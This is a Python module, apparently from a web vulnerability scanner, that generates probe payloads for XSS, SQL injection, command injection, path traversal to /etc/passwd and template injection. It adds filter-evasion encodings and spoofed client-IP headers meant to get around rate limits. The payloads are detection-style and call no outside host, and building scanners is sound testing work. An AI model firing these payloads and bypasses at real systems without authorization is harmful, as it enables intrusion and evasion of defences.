





from __future__ import annotations

from urllib.parse import quote

XSS_BASE = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]
SQLI_BASE = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    '" OR "1"="1',
]
TRAVERSAL_BASE = ["../../../../etc/passwd"]

_ENT = {"<": "&#60;", ">": "&#62;", "/": "&#47;", "'": "&#39;", '"': "&#34;", " ": "&#32;"}


def _u(s: str, safe: str = "") -> str:
    return quote(s, safe=safe)


def _dbl(s: str) -> str:
    return quote(quote(s, safe=""), safe="")


def _ent(s: str, hexform: bool = False, semi: bool = True) -> str:
    out = []
    for ch in s:
        e = _ENT.get(ch)
        if e is None and ord(ch) > 126:
            e = f"&#x{ord(ch):x};" if hexform else f"&#{ord(ch)};"
        if e is None:
            out.append(ch)
            continue
        out.append(e if semi else e.rstrip(";"))
    return "".join(out)


def _xss_variants(p: str) -> list[tuple[str, str]]:
    return [
        ("raw", p),
        ("pct-lower", _u(p)),
        ("pct-upper", _u(p).upper()),
        ("double-pct", _dbl(p)),
        ("html-dec", _ent(p)),
        ("html-dec-nosemi", _ent(p, semi=False)),
        ("html-hex", _ent(p, hexform=True)),
        ("null-prefix", "%00" + p),
        ("tab-sep", p.replace(" ", "\t")),
        ("nl-sep", p.replace(" ", "\n")),
        ("comment-break", p.replace("<script>", "<scr/**/ipt>")),
        ("split-tag", p.replace("<script>", "<scr<script>ipt>")),
    ]


def _sqli_variants(p: str) -> list[tuple[str, str]]:
    return [
        ("raw", p),
        ("pct-lower", _u(p)),
        ("double-pct", _dbl(p)),
        ("comment-space", p.replace(" ", "/**/")),
        ("pct-tab", _u(p.replace(" ", "\t"))),
        ("hash-end", p.replace("--", "#")),
        ("dashplus-end", p.replace("--", "--+")),
    ]


def _cmdi_marker(marker: str) -> list[tuple[str, str]]:

    return [
        ("semi-echo", f";echo {marker}"),
        ("pipe-echo", f"|echo {marker}"),
        ("and-echo", f"&&echo {marker}"),
        ("subshell", f"$(echo {marker})"),
        ("backtick", f"`echo {marker}`"),
        ("nl-echo", f"%0aecho {marker}"),
        ("pct-amp", f"%26echo {marker}"),
    ]


def _traversal_variants(p: str) -> list[tuple[str, str]]:
    return [
        ("raw", p),
        ("pct-dots", p.replace("../", "%2e%2e%2f")),
        ("double-pct", p.replace("../", "%252e%252e%252f")),
        ("pct-dotdot", p.replace("../", "..%2f")),
        ("win-backslash", p.replace("../", "..\\")),
        ("win-semi", p.replace("../", "..;/")),
        ("overlong-utf8", p.replace("../", "%c0%ae%c0%ae/")),
        ("double-slash", p.replace("../../", "....//")),
    ]


def _ssti_variants() -> list[tuple[str, str]]:
    return [
        ("jinja-mul", "{{7*7}}"),
        ("dollar-mul", "${7*7}"),
        ("erb-mul", "<%= 7*7 %>"),
        ("velo-mul", "#{7*7}"),
    ]


_BUILDERS = {
    "xss": lambda p, m: _xss_variants(p),
    "sqli": lambda p, m: _sqli_variants(p),
    "cmdi": lambda p, m: _cmdi_marker(m),
    "traversal": lambda p, m: _traversal_variants(p),
    "ssti": lambda p, m: _ssti_variants(),
}
_BASES = {
    "xss": XSS_BASE,
    "sqli": SQLI_BASE,
    "traversal": TRAVERSAL_BASE,
}


def build_probes(vectors: tuple, marker: str = "", bypass: bool = False) -> list[tuple[str, str, str]]:

    out: list[tuple[str, str, str]] = []
    for cat in vectors:
        cat = cat.strip().lower()
        builder = _BUILDERS.get(cat)
        if not builder:
            continue
        bases = _BASES.get(cat, [""])
        for base in bases:
            for name, payload in builder(base, marker):
                if not bypass and name != "raw":
                    continue
                out.append((cat, name, payload))
    seen: set[tuple[str, str]] = set()
    deduped = []
    for cat, name, payload in out:
        k = (cat, payload)
        if k in seen:
            continue
        seen.add(k)
        deduped.append((cat, name, payload))
    return deduped


RATELIMIT_HEADERS = [
    {},
    {"X-Forwarded-For": "1.1.1.1"},
    {"X-Forwarded-For": "1.2.3.4"},
    {"X-Real-IP": "5.6.7.8"},
    {"CF-Connecting-IP": "9.9.9.9"},
    {"X-Client-IP": "8.8.8.8"},
    {"Forwarded": "for=10.0.0.5"},
    {"X-Forwarded-For": "1.2.3.4",
     "X-Real-IP": "1.2.3.4"},
]


def ratelimit_vectors(target: str) -> list[dict]:

    return [
        {"url": target, "method": "GET", "headers": h, "category": "ratelimit"}
        for h in RATELIMIT_HEADERS
    ]

